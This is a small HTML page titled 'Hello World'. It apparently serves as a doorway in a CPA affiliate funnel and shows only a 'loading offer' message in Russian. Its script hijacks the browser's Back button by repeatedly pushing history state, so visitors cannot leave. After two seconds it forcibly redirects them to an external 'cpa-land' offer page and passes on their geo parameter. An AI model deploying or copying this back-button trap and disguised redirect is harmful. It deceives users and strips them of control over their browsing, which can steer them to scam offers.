<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello World</title>
    <style>
        body { font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #222; color: #fff; text-align: center; }
        h1 { font-size: 40px; color: #ffcc00; }
    </style>
</head>
<body>
    <div>
        <h1>Hello World</h1>
        <p>Загрузка предложения...</p>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const geo = urlParams.get('geo') || 'unknown';

        // Записываем в историю, чтобы кнопка "Назад" не выкинула из сайта
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.pushState(null, null, location.href);
        };

        // Через 2 секунды перекидываем на Бокс
        setTimeout(() => {
            window.location.href = 'https://azosteam.github.io/cpa-land/box.html?geo=' + geo;
        }, 2000);
    </script>
</body>
</html>
